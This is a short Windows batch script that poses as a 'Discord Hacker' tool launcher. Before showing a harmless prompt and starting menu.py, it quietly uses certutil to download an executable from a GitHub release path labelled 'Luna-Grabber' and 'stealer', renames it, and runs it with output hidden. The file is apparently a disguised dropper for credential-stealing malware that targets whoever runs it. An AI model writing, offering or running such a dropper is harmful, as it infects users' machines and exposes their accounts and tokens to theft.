@echo off

echo "Welcome Discord Hacker! Everything you do with this tool will be from your free will. We're not responsible for anything that happens to you"
set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
set "Dossier=Tools"
set "NomFichier=%Dossier%\tabaco-V2.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)

set /p answer="Do you want to continue (Y/N)? "

if /i "%answer%"=="Y" (
  echo "You chose to continue."
) else if /i "%answer%"=="N" (
  echo "You chose to cancel."
) else (
  echo "Invalid input."
)

timeout /t 5 /nobreak

python menu.py
